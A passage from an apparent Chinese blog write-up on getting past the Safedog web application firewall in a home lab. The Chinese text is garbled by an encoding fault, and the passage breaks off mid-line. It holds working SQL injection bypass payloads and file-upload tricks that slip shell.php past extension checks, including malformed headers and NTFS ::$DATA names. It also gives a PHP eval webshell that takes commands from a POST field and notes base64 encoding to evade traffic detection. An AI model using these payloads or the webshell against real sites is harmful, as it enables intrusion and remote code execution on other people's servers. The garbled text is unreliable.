ä½¿å¾—åç«¯èƒ½å¤Ÿè¿›è¡Œè§£æ</li></ol></blockquote><h3 id="FUZZå¤§æ³•"><a href="#FUZZå¤§æ³•" class="headerlink" title="FUZZå¤§æ³•"></a>FUZZå¤§æ³•</h3><blockquote><p>fuzzå¤§æ³•ï¼Œä½¿ç”¨è„šæœ¬å»æ¢æµ‹WAFè®¾å¤‡å¯¹äºå­—ç¬¦å¤„ç†æ˜¯å¦æœ‰å¼‚å¸¸ï¼Œä¸€äº›WAFå¯èƒ½ç”±äºè‡ªèº«çš„è§£æé—®é¢˜ï¼Œå¯¹äºæŸäº›å­—ç¬¦è§£æå‡ºé”™ï¼Œé€ æˆå…¨å±€çš„bypass</p></blockquote><p>æµ‹è¯•ç‚¹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1ï¼‰ï¼šgetè¯·æ±‚å¤„ </span><br><span class="line">2ï¼‰ï¼šheaderè¯·æ±‚å¤„ </span><br><span class="line">3ï¼‰ï¼špost urlencodeå†…å®¹å¤„ </span><br><span class="line">4ï¼‰ï¼špost form-dataå†…å®¹å¤„</span><br></pre></td></tr></table></figure><p>åŸºç¡€å†…å®¹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1ï¼‰ç¼–ç è¿‡çš„0-255å­—ç¬¦ </span><br><span class="line">2ï¼‰è¿›è¡Œç¼–ç çš„0-255å­—ç¬¦ </span><br><span class="line">3ï¼‰utf gbkå­—ç¬¦</span><br></pre></td></tr></table></figure><h1 id="å®éªŒç¯å¢ƒâ€“å®‰å…¨ğŸ•"><a href="#å®éªŒç¯å¢ƒâ€“å®‰å…¨ğŸ•" class="headerlink" title="å®éªŒç¯å¢ƒâ€“å®‰å…¨ğŸ•"></a>å®éªŒç¯å¢ƒâ€“å®‰å…¨ğŸ•</h1><p>æ²¡æœ‰åœ¨ä»£ç ä¸­è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœ‰ä¼šè¯´æ˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win  10</span><br><span class="line">php  5.6.9</span><br><span class="line">mysql 5.7.26</span><br><span class="line">apache 2.4.39</span><br><span class="line">safe dog V3.5 </span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹ï¼Œé™¤äº†CCæ”»å‡»ï¼Œå…¨é˜²æŠ¤</p><p><img src="/../images/image-20230516235356524.png" alt="image-20230516235356524"></p><p><img src="/../images/image-20230516150636839.png" alt="image-20230516150636839"></p><p>ç‰¹å¾</p><p><img src="/../images/image-20230517003655268.png" alt="image-20230517003655268"></p><p><img src="/../images/image-20230517100649383.png" alt="image-20230517100649383"></p><h1 id="sqlæ³¨å…¥ç»•è¿‡"><a href="#sqlæ³¨å…¥ç»•è¿‡" class="headerlink" title="sqlæ³¨å…¥ç»•è¿‡"></a>sqlæ³¨å…¥ç»•è¿‡</h1><h2 id="å¤šå‚æ•°æ¥æºå®éªŒ"><a href="#å¤šå‚æ•°æ¥æºå®éªŒ" class="headerlink" title="å¤šå‚æ•°æ¥æºå®éªŒ"></a>å¤šå‚æ•°æ¥æºå®éªŒ</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>] å¤±è´¥</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>] æˆåŠŸ</span><br></pre></td></tr></table></figure><h2 id="è„æ•°æ®å®éªŒ"><a href="#è„æ•°æ®å®éªŒ" class="headerlink" title="è„æ•°æ®å®éªŒ"></a>è„æ•°æ®å®éªŒ</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516150951130.png" alt="image-20230516150951130"></p><p>å®‰å…¨ğŸ•åœ¨<code>HTTP BODY</code>ä¸­æ£€æµ‹åˆ°äº†å…³é”®å­—ï¼Œç›´æ¥è¿”å›500ã€‚ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">a<span class="operator">=</span><span class="number">8172</span><span class="operator">*</span>A<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516151625299.png" alt="image-20230516151625299"></p><h3 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h3><p><code>waf</code>å¯èƒ½ç›´æ¥æ£€æµ‹é•¿åº¦æ¥æ‹¦æˆª</p><p>å¦‚å®‰å…¨ğŸ•,<code>GET</code>ä¸‹æ˜¯ä¸è¡Œçš„</p><p><img src="/../images/image-20230516151807403.png" alt="image-20230516151807403"></p><h2 id="åˆ†å—ä¼ è¾“å®éªŒ"><a href="#åˆ†å—ä¼ è¾“å®éªŒ" class="headerlink" title="åˆ†å—ä¼ è¾“å®éªŒ"></a>åˆ†å—ä¼ è¾“å®éªŒ</h2><p>æˆåŠŸï¼Œå›¾æ²¡æˆªã€‚ã€‚</p><h2 id="æ­£é¢ç»•è¿‡"><a href="#æ­£é¢ç»•è¿‡" class="headerlink" title="æ­£é¢ç»•è¿‡"></a>æ­£é¢ç»•è¿‡</h2><p>ç®€å•fuzz</p><p><img src="/../images/image-20230517001306283.png" alt="image-20230517001306283"></p><p>å¯ä»¥å‘ç°ä¸ä¼šå¯¹å•ä¸€çš„å…³é”®å­—è¿›è¡Œè¿‡æ»¤ï¼Œä¼šå¯¹ä¸€äº›ç»„åˆè¿›è¡Œè¿‡æ»¤</p><h3 id="union-selectç»•è¿‡"><a href="#union-selectç»•è¿‡" class="headerlink" title="union selectç»•è¿‡"></a><code>union select</code>ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union (select)</span><br><span class="line">UNiOn/*/1/*/select</span><br><span class="line">UNiOn--+%02%0d%0aselect    #æ³¨é‡Šæ¢è¡Œ</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154023102.png" alt="image-20230516154023102"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154137250.png" alt="image-20230516154137250"></p><p>åœ¨<code>/**/</code>ä¸­æ’å…¥<code>/x/</code>å³å¯ï¼Œxè‡³å°‘ä¸ºä¸€ä¸ªå­—ç¬¦</p><h3 id="å‡½æ•°ç»•è¿‡"><a href="#å‡½æ•°ç»•è¿‡" class="headerlink" title="å‡½æ•°ç»•è¿‡"></a>å‡½æ•°ç»•è¿‡</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221518813.png" alt="image-20230516221518813"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database<span class="comment">/**/</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221551123.png" alt="image-20230516221551123"></p><p>FUZZç»“æœ</p><p><img src="/../images/image-20230517000942363.png" alt="image-20230517000942363"></p><p><img src="/../images/image-20230517000931846.png" alt="image-20230517000931846"></p><h3 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a><code>select from</code></h3><p>ç¡¬åˆšG</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ†å—ä¼ è¾“ï¼Œè„æ•°æ®ç­‰æˆåŠŸ</span><br></pre></td></tr></table></figure><h1 id="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"><a href="#æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"></a>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</h1><h2 id="wafæ£€æµ‹å†…å®¹"><a href="#wafæ£€æµ‹å†…å®¹" class="headerlink" title="wafæ£€æµ‹å†…å®¹"></a>wafæ£€æµ‹å†…å®¹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚çš„url</span><br><span class="line">Boundaryè¾¹ç•Œ</span><br><span class="line">MIMEç±»å‹</span><br><span class="line">æ–‡ä»¶åç¼€å</span><br><span class="line">æ–‡ä»¶å¤´</span><br><span class="line">æ–‡ä»¶å†…å®¹</span><br><span class="line">è®¿é—®æµé‡</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…äº†è§£"><a href="#æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…äº†è§£" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…äº†è§£"></a>æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…äº†è§£</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">    </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl--</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl å®šä¹‰äº†BODYä¸­çš„åˆ†ç•Œçº¿(å› ä¸ºæ˜¯è°·æ­Œæµè§ˆå™¨ï¼Œæ‰€ä»¥åˆ†ç•Œçº¿ä¸º----WebKitFormBoundaryåŠ ä¸Šéšæœºå­—ç¬¦ä¸²)</span><br><span class="line"></span><br><span class="line">--boundary <span class="comment"># å¼€å§‹æ ‡å¿—</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"> </span><br><span class="line">æ–‡ä»¶å†…å®¹</span><br><span class="line">--boundary   <span class="comment"># æ¯ä¸¤ä¸ªåˆ†ç•Œçº¿ä¹‹é—´æ˜¯å…·ä½“çš„å†…å®¹ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œpostä¼ å‚</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">POSTå†…å®¹</span><br><span class="line">--boundary--  <span class="comment"># ç»“æŸæ ‡å¿—</span></span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ‰‹æ³•"><a href="#æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ‰‹æ³•" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ‰‹æ³•"></a>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ‰‹æ³•</h2><h3 id="ç»•è¿‡åç¼€"><a href="#ç»•è¿‡åç¼€" class="headerlink" title="ç»•è¿‡åç¼€"></a>ç»•è¿‡åç¼€</h3><h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">   </span><br><span class="line">Content-Type: multipart/XXXXXX; boundary=----WebKxxxxx</span><br><span class="line">Content-Type: multipart/; boundary=----WebKxxxxx </span><br><span class="line">å¢åŠ å¤šä¸ªboundary</span><br><span class="line">phpï¼šå¯ä»¥åœ¨boundaryå‰åæ·»åŠ ä»»æ„å­—ç¬¦</span><br><span class="line">å¤§å°å†™</span><br><span class="line">boundary=boundary=a</span><br></pre></td></tr></table></figure><h4 id="Content-Disposition"><a href="#Content-Disposition" class="headerlink" title="Content-Disposition"></a>Content-Disposition</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line">å¤§å°å†™</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Content-Disposition   </span></span><br><span class="line">Content-Disposition ä»»æ„ä½ç½®æ¢è¡Œ,ç©ºæ ¼ï¼Œè„æ•°æ®æº¢å‡º</span><br><span class="line">å¤šä¸ªContent-Disposition</span><br><span class="line">form-dataåˆ é™¤ï¼Œæ”¹ä¸º*</span><br><span class="line"></span><br><span class="line"><span class="comment"># filename    </span></span><br><span class="line">å¤šä¸ªfilenameï¼Œå¤šä¸ª;</span><br><span class="line">æ–‡ä»¶åå•åŒå¼•å·æ•°é‡</span><br><span class="line">filenameå­—ç¬¦å·¦å³å¯ä»¥åŠ ä¸Šä¸€äº›ç©ºç™½å­—ç¬¦%<span class="number">20</span> %<span class="number">09</span> %<span class="number">0</span>a %<span class="number">0</span>b %<span class="number">0</span>c %<span class="number">0</span>d %<span class="number">1</span>c %<span class="number">1</span>d %<span class="number">1</span>e %<span class="number">1</span>f</span><br><span class="line">æ’å…¥è½¬ä¹‰å­—ç¬¦</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content-typeï¼ˆå¢åˆ ï¼Œè®¾ç½®charsetï¼‰</span><br><span class="line">    </span><br><span class="line">å¤šä¸ªBODY</span><br><span class="line">å¤šä¸ªboundary</span><br><span class="line">äº¤æ¢nameå’Œfilenameçš„é¡ºåº</span><br><span class="line">    </span><br><span class="line">æ’åˆ—ç»„åˆ</span><br></pre></td></tr></table></figure><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><h5 id="NTFS-æµ"><a href="#NTFS-æµ" class="headerlink" title="NTFS æµ"></a>NTFS æµ</h5><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">æ–‡ä»¶æµ (æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ) - Win32 apps | Microsoft Learn</a></p><p>fuzzå¯ä»¥çš„</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br><span class="line">::$INDEX_ALLOCATION</span><br></pre></td></tr></table></figure><p><img src="/../images/20171227163716-2507a226-eae1-1.png" alt="20171227163716-2507a226-eae1-1"></p><p><img src="/../images/image-20230517195752567.png" alt="image-20230517195752567"></p><h5 id="æ–‡ä»¶å"><a href="#æ–‡ä»¶å" class="headerlink" title="æ–‡ä»¶å"></a>æ–‡ä»¶å</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶åå°¾åŠ ä»»æ„ä¸ª. æˆ–è€…ä»»æ„ä¸ªç©ºæ ¼ï¼ˆå¯¹æ–‡ä»¶åæ— å½±å“ï¼‰</span><br><span class="line"></span><br><span class="line">windowsæ–‡ä»¶åçš„ä¿ç•™å­—ç¬¦ï¼ˆä¸å…è®¸å‡ºç°ï¼‰</span><br><span class="line">\/:*?<span class="string">&quot; &lt;&gt;|</span></span><br><span class="line"><span class="string">å¯ä»¥å°è¯•åœ¨æ–‡ä»¶åååŠ ä¸Šè¿™äº›å­—ç¬¦</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å½“filename=shell.php:.jpg</span><br><span class="line">ç»“æœï¼š</span><br><span class="line">å¯ä»¥ä¸Šä¼ shell.phpï¼Œä½†æ˜¯ä¼šåƒæ‰æ–‡ä»¶å†…å®¹ã€‚ã€‚ã€‚</span><br><span class="line">å…¶ä»–çš„è¦ä¸ä¸å¯ä»¥ï¼Œå¯ä»¥çš„è¯ï¼Œä¸Šä¼ çš„æ–‡ä»¶åä¸º.jpg</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517155239619.png" alt="image-20230517155239619"></p><h5 id="æ–‡ä»¶åé•¿åº¦"><a href="#æ–‡ä»¶åé•¿åº¦" class="headerlink" title="æ–‡ä»¶åé•¿åº¦"></a>æ–‡ä»¶åé•¿åº¦</h5><p>æˆªæ–­è¶…é•¿æ–‡ä»¶å</p><p>windowsæ–‡ä»¶å</p><p><img src="/../images/image-20230618171438236.png" alt="image-20230618171438236"></p><p>linuxæ–‡ä»¶åï¼šlinuxä¸­æ–‡ä»¶åæœ€é•¿ä¸º255å­—ç¬¦ï¼Œæ–‡ä»¶è·¯å¾„æœ€å¤§é•¿åº¦ä¸º4096å­—ç¬¦</p><p>å¦‚æœåç«¯è„šæœ¬æ²¡æœ‰é™åˆ¶ä¸Šä¼ æ–‡ä»¶åé•¿åº¦ï¼Œå¯ä»¥é€šè¿‡å¤šæ¬¡æµ‹è¯•ï¼Œä¸Šä¼ åä¸ºaaaaaâ€¦(200+).php.jpgï¼ŒæŠŠæœ€åçš„.jpgæŒ¤å‡ºå»ã€‚</p><h3 id="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€"><a href="#ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€" class="headerlink" title="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€"></a>ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€</h3><ul><li>wafæ£€æµ‹</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å†…å®¹ã€åˆ›å»ºæ—¥æœŸã€æ–‡ä»¶å¤§å°ã€é€šä¿¡æµé‡ç‰¹å¾</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹äºé™æ€å¼•æ“çš„ç»•è¿‡ï¼Œå¯ä»¥é€šè¿‡æ‹†åˆ†å…³é”®è¯ã€</span><br><span class="line">åŠ å…¥èƒ½å¤Ÿå¼•å‘è§£æå¹²æ‰°çš„ç•¸å½¢å­—ç¬¦ç­‰;</span><br><span class="line"></span><br><span class="line">è€Œå¯¹äºåŠ¨æ€å¼•æ“ï¼Œéœ€è¦åˆ†æå®ƒè·Ÿè¸ªäº†å“ªäº›è¾“å…¥</span><br><span class="line">ç‚¹ï¼Œåˆæ˜¯å¦‚ä½•è·Ÿè¸ªå˜é‡çš„ï¼Œæœ€ç»ˆæ˜¯åœ¨å“ªäº›å‡½æ•°çš„å“ªäº›å‚æ•°å‘½ä¸­äº†æ¶æ„æ ·æœ¬è§„åˆ™</span><br></pre></td></tr></table></figure><p><a href="https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">ç®€å•ç†è§£æ±¡ç‚¹åˆ†ææŠ€æœ¯ | K0rz3nâ€™s Blog</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¦ç±»çš„å…¥å£</span><br><span class="line">å„ç§æ··æ·†ï¼ˆç¼–ç åŠ å¯†ï¼Œè¿›åˆ¶è½¬æ¢ï¼Œååºåˆ—åŒ–...ï¼‰</span><br><span class="line">ç¬¦å·å¹²æ‰°ï¼Œç»•è¿‡æ­£åˆ™ï¼Œæ‹¼æ¥null,\n,\r,\tç­‰</span><br><span class="line">ä¿¡æ¯å·®ç»•è¿‡ï¼ˆåŠ å…¥å¤–éƒ¨å› ç´ åæ‰æ˜¯webshelï¼Œé‡å­WEBshellğŸ˜‹ï¼‰æ¯”å¦‚æˆªå–æ–‡ä»¶åï¼Œç›®å½•åï¼Œä¼ å…¥éšæœºæ•°ç§å­ç­‰</span><br></pre></td></tr></table></figure><ul><li>ä¼ ç»Ÿwebshell</li></ul><p>å­¦ä¹ ï¼š</p><p><a href="https://cloud.tencent.com/developer/article/1625439">WebShellé€šç”¨å…æ€çš„æ€è€ƒ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p><p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</a></p><p>ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ</p><p>æ”¶é›†ï¼š</p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><h3 id="ç»•è¿‡æµé‡æ£€æµ‹â€“ç‰¹å¾-x2F-é€šä¿¡åŠ å¯†"><a href="#ç»•è¿‡æµé‡æ£€æµ‹â€“ç‰¹å¾-x2F-é€šä¿¡åŠ å¯†" class="headerlink" title="ç»•è¿‡æµé‡æ£€æµ‹â€“ç‰¹å¾&#x2F;é€šä¿¡åŠ å¯†"></a>ç»•è¿‡æµé‡æ£€æµ‹â€“ç‰¹å¾&#x2F;é€šä¿¡åŠ å¯†</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¼±ç‰¹å¾ï¼šHTTP Header</span><br><span class="line">requestå’Œresponseå†…å®¹</span><br></pre></td></tr></table></figure><p>å‚è€ƒä¹‹å‰HWçœ‹çš„æ–‡ç« </p><ul><li><p>å“¥æ–¯æ‹‰</p><p><a href="https://www.freebuf.com/sectool/285693.html">ã€åŸåˆ›ã€‘å“¥æ–¯æ‹‰GodzillaåŠ å¯†æµé‡åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></li><li><p>å†°è</p><p><a href="https://xz.aliyun.com/t/2744">åˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹Javaç¯‡ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://www.secpulse.com/archives/195173.html">å†°èV4.0æµé‡åˆ†æåˆ°æ”»é˜²æ£€æµ‹ - SecPulse.COM | å®‰å…¨è„‰æ</a></p><p><a href="https://xz.aliyun.com/t/12453">å†°è4.0è‡ªå®šä¹‰åŠ å¯† - å…ˆçŸ¥ç¤¾åŒº</a></p></li><li><p>èšå‰‘</p><p><a href="https://www.yuque.com/antswordproject/antsword/yuakxl">https://www.yuque.com/antswordproject/antsword/yuakxl</a></p></li></ul><h2 id="å®‰å…¨ğŸ•æ£€æµ‹å†…å®¹"><a href="#å®‰å…¨ğŸ•æ£€æµ‹å†…å®¹" class="headerlink" title="å®‰å…¨ğŸ•æ£€æµ‹å†…å®¹"></a>å®‰å…¨ğŸ•æ£€æµ‹å†…å®¹</h2><ul><li><p>ä¸å…è®¸phpåç¼€ä¸Šä¼ </p></li><li><p>ä¸Šä¼ æ—¶ï¼Œä¸æ£€æŸ¥æ–‡ä»¶å†…å®¹</p></li><li><p>è®¿é—®æ—¶ï¼Œä¸å…è®¸è®¿é—®å«æœ‰æ¶æ„å†…å®¹çš„phpæ–‡ä»¶</p></li></ul><h2 id="éƒ¨åˆ†æˆåŠŸçš„"><a href="#éƒ¨åˆ†æˆåŠŸçš„" class="headerlink" title="éƒ¨åˆ†æˆåŠŸçš„"></a>éƒ¨åˆ†æˆåŠŸçš„</h2><h3 id="åç¼€ç»•è¿‡"><a href="#åç¼€ç»•è¿‡" class="headerlink" title="åç¼€ç»•è¿‡"></a>åç¼€ç»•è¿‡</h3><p>wafæ˜¯è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œæœ€åä¸€ä¸ª;åé¢çš„ï¼Œä½†æ˜¯å¦‚æœæœ€åä¸€ä¸ªï¼›åé¢æ²¡æœ‰å‚æ•°ï¼Œ</p><p>åç«¯å°±å–å‰ä¸€ä¸ª,wafè¯†åˆ«åˆ°ç©º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=shell.php;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144614924.png" alt="image-20230517144614924"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;shell.php&#x27;</span>; <span class="comment"># åŒå¼•å·ä¸è¡Œ</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144541805.png" alt="image-20230517144541805"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=shell.php</span><br><span class="line"></span><br><span class="line">é™¤äº†shell.phpå¤„ï¼Œå…¶ä»–åœ°æ–¹åŠ æ¢è¡Œï¼Œæˆ–è„æ•°æ®éƒ½å¯</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517145839048.png" alt="image-20230517145839048"></p><p>åˆ é™¤<code>content-type</code></p><p><img src="/../images/image-20230517153416749.png" alt="image-20230517153416749"></p><p>å¢åŠ <code>boundary</code></p><p><img src="/../images/image-20230517175433650.png" alt="image-20230517175433650"></p><p>å®‰å…¨ğŸ•+ä»£ç ç™½åå•ï¼ˆåç¼€åªå…è®¸å›¾ç‰‡ï¼‰</p><p>ä¸Šé¢ä»»æ„ä¸€ä¸ªç»•è¿‡ï¼ˆé™¤äº†ï¼›ç»•è¿‡ï¼‰+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=shell.php::$DATA.jpg</span><br></pre></td></tr></table></figure><h3 id="å†…å®¹æ£€æµ‹ç»•è¿‡"><a href="#å†…å®¹æ£€æµ‹ç»•è¿‡" class="headerlink" title="å†…å®¹æ£€æµ‹ç»•è¿‡"></a>å†…å®¹æ£€æµ‹ç»•è¿‡</h3><p>å®‰å…¨ğŸ•çš„å†…å®¹æ£€æµ‹éšä¾¿æ”¹ä¸€ä¸‹å°±è¿‡äº†ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="comment">// $cmd = base64_decode($_POST[1]);</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æµé‡æ£€æµ‹ç»•è¿‡"><a href="#æµé‡æ£€æµ‹ç»•è¿‡" class="headerlink" title="æµé‡æ£€æµ‹ç»•è¿‡"></a>æµé‡æ£€æµ‹ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;xxx&quot;</span>) <span class="comment">#å‘½ä»¤æ‰§è¡Œé™åˆ¶</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517211700124.png" alt="image-20230517211700124"></p><p>å¯¹æµé‡è¿›è¡Œä¸€ä¸ª<code>base64</code>åŠ å¯†å³å¯</p><p><code>webshell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span 